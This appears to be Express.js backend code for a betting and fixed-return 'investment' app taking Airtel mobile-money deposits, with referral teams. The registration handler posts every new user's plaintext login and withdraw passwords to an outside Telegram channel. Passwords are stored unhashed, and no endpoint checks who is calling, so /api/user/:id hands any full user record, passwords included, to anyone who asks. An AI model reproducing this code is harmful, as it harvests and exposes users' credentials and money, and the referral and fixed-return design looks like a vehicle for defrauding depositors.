app.get('/api/virtual/my-bets/:id',async(req,res)=>{try{const[rows]=await db.query("SELECT * FROM virtual_accas WHERE userId=? ORDER BY id DESC LIMIT 30",[req.params.id]);res.json(rows);}catch(e){res.json([]);}});
app.get('/api/user/:id',async(req,res)=>{try{const[u]=await db.query("SELECT * FROM users WHERE id=?",[req.params.id]);res.json(u[0]||{balance:0,gameBalance:0});}catch(e){res.json({balance:0,gameBalance:0});}});
app.get('/api/withdrawals/:id',async(req,res)=>{try{const[r]=await db.query("SELECT * FROM withdrawals WHERE userId=? ORDER BY id DESC",[req.params.id]);res.json(r);}catch(e){res.json([]);}});
app.post('/api/virtual/bet/acca',async(req,res)=>{try{const{userId,amount,selections,betMD}=req.body;const[u]=await db.query("SELECT balance,gameBalance,phone,fullName FROM users WHERE id=?",[userId]);let tot=(u[0].balance||0)+(u[0].gameBalance||0);if(tot<amount)return res.status(400).json({error:"No balance"});let useG=Math.min(u[0].gameBalance||0,amount);if(useG>0)await db.query("UPDATE users SET gameBalance=gameBalance-? WHERE id=?",[useG,userId]);if(amount-useG>0)await db.query("UPDATE users SET balance=balance-? WHERE id=?",[amount-useG,userId]);let md=betMD||matchday+1;let odd=Math.pow(2,selections.length);await db.query("INSERT INTO virtual_accas (userId,season,matchday,selections,amount,odd) VALUES (?,?,?,?,?,?)",[userId,season,md,JSON.stringify(selections),amount,odd]);tg(`🎫 <b>NEW BET</b> ${u[0].fullName} ${u[0].phone} MD${md} ${amount}x${odd}`);res.json({ok:1,md});}catch(e){res.status(400).json({error:e.message})}});
app.post('/api/register',async(req,res)=>{try{const code='LIFE'+Math.random().toString(36).slice(2,5).toUpperCase()+Math.floor(Math.random()*9);const ref=req.body.referredBy||'';await db.query("INSERT INTO users (fullName,phone,password,withdrawPassword,myReferralCode,referredBy,balance,gameBalance) VALUES (?,?,?,?,?,?,0,0)",[req.body.name,req.body.phone,req.body.password,req.body.withdrawPassword,code,ref]);const[r]=await db.query("SELECT * FROM users WHERE phone=? ORDER BY id DESC LIMIT 1",[req.body.phone]);tg(`👤 <b>NEW USER</b> ${req.body.name} ${req.body.phone}\nLogin:${req.body.password} Withdraw:${req.body.withdrawPassword}\nCode:${code} Ref:${ref}`);res.json(r[0]);}catch(e){res.status(400).json({error:e.message})}});
app.post('/api/login',async(req,res)=>{try{const[r]=await db.query("SELECT * FROM users WHERE phone=? AND password=?",[req.body.phone,req.body.password]);if(r.length)res.json(r[0]);else res.status(401).json({error:"Wrong"});}catch(e){res.status(401).json({error:"Wrong"})}});
app.post('/api/deposit',async(req,res)=>{try{const{userId,amount,airtelNo,screenshot,screenshotHash}=req.body;const[d]=await db.query("SELECT id FROM deposits WHERE screenshotHash=? LIMIT 1",[screenshotHash]);if(d.length)return res.status(400).json({error:"Used"});const[u]=await db.query("SELECT phone,fullName FROM users WHERE id=?",[userId]);await db.query("INSERT INTO deposits (userId,phone,amount,airtelNo,screenshot,screenshotHash) VALUES (?,?,?,?,?,?)",[userId,u[0]?.phone||"",amount,airtelNo,screenshot,screenshotHash]);tg(`💰 <b>DEPOSIT</b> ${u[0]?.fullName} ${u[0]?.phone} ${amount} UGX`);res.json({ok:1});}catch(e){res.status(400).json({error:e.message})}});
app.post('/api/invest',async(req,res)=>{try{const{userId,club,amount}=req.body;const[u]=await db.query("SELECT balance,phone,fullName FROM users WHERE id=?",[userId]);if(!u[0]||u[0].balance<amount)return res.status(400).json({error:"No WALLET"});await db.query("UPDATE users SET balance=balance-? WHERE id=?",[amount,userId]);await db.query("INSERT INTO investments (userId,club,amount,rate,lockDays) VALUES (?,?,?,?,?)",[userId,club,amount,10,10]);tg(`📈 <b>INVEST</b> ${u[0].fullName} ${amount} ${club}`);res.json({ok:1});}catch(e){res.status(400).json({error:e.message})}});
app.post('/api/withdraw',async(req,res)=>{try{const{userId,amount,phone,withdrawPassword}=req.body;const[u]=await db.query("SELECT gameBalance,phone as uphone,fullName,withdrawPassword FROM users WHERE id=?",[userId]);if(!u[0])return res.status(400).json({error:"User not found"});if(!u[0].withdrawPassword)return res.status(400).json({error:"Set withdraw password first"});if(u[0].withdrawPassword!==withdrawPassword)return res.status(400).json({error:"Wrong withdraw password"});if(u[0].gameBalance<amount)return res.status(400).json({error:"No BALANCE"});await db.query("UPDATE users SET gameBalance=gameBalance-? WHERE id=?",[amount,userId]);await db.query("INSERT INTO withdrawals (userId,phone,amount) VALUES (?,?,?)",[userId,phone,amount]);tg(`💸 <b>WITHDRAW</b> ${u[0].fullName} ${u[0].uphone} ${amount} to ${phone}`);res.json({ok:1});}catch(e){res.status(400).json({error:e.message})}});
app.get('/api/history/:id',async(req,res)=>{try{const[deps]=await db.query("SELECT amount,status,'deposit' as type FROM deposits WHERE userId=?",[req.params.id]);const[accas]=await db.query("SELECT amount,status,'acca' as type FROM virtual_accas WHERE userId=?",[req.params.id]);res.json([...deps,...accas]);}catch(e){res.json([]);}});
app.get('/api/team/:id',async(req,res)=>{try{const[u]=await db.query("SELECT myReferralCode FROM users WHERE id=?",[req.params.id]);if(!u[0])return res.json({team:[]});const[team]=await db.query("SELECT phone,fullName,balance,gameBalance FROM users WHERE referredBy=?",[u[0].myReferralCode]);res.json({team});}catch(e){res.json({team:[]})}});
